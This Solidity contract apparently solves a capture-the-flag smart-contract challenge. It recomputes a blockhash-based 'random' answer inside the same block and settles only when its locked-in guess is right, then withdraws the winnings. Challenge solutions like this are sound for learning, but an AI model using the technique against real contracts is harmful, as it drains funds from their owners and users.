pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract PredictTheFutureSolver {
    PredictTheFutureChallenge public challenge;
    uint8 public guess;

    function PredictTheFutureSolver(address _challenge, uint8 _guess) public payable {
        require(msg.value == 1 ether);
        challenge = PredictTheFutureChallenge(_challenge);
        guess = _guess;
        challenge.lockInGuess.value(1 ether)(guess);
    }

    function() public payable {}

    function smartSettle() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (answer == guess) {
          challenge.settle();
          require(address(this).balance == 2 ether);
          msg.sender.transfer(address(this).balance);
        }
    }
}
